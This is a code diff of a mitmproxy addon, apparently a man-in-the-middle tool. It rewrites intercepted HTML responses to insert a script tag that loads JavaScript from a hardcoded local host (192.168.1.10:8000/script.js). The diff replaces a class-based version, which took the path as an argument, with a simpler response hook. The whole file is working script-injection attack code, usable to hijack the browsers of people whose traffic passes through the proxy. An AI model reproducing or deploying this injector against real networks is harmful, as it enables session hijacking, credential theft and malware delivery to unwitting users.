@@ -4,31 +4,18 @@ from bs4 import BeautifulSoup
 from mitmproxy import ctx, http
 import argparse
 
-class Injector:
-    def __init__(self, path):
-        self.path = path
-
-    def response(self, flow: http.HTTPFlow) -> None:
-        if self.path:
-            html = BeautifulSoup(flow.response.content, "html.parser")
-            print( html)
-            print(self.path)
-            print(flow.response.headers["content-type"])
-            if flow.response.headers["content-type"] == 'text/html':
-                print(flow.response.headers["content-type"])
-                script = html.new_tag(
-                    "script",
-                    src=self.path,
-                    type='application/javascript')
-                print("script",script)
-
-                print( html.body)
-                html.body.insert(0, script)
-                flow.response.content = str(html).encode("utf8")
-                print("Script injected.")
-
-def start():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("path", type=str)
-    args = parser.parse_args()
-    return Injector(args.path)
+def response(flow: http.HTTPFlow) -> None:
+    print("response")
+    path="http://192.168.1.10:8000/script.js"
+    if path:
+        html = BeautifulSoup(flow.response.content, "html.parser")
+        print(path)
+        print(flow.response.headers["content-type"])
+        if 'text/html'in flow.response.headers["content-type"] :
+            script = html.new_tag(
+                "script",
+                src=path,
+                type='application/javascript')
+            html.html.insert(0, script)
+            flow.response.content = str(html).encode("utf8")
+            print("Script injected.")
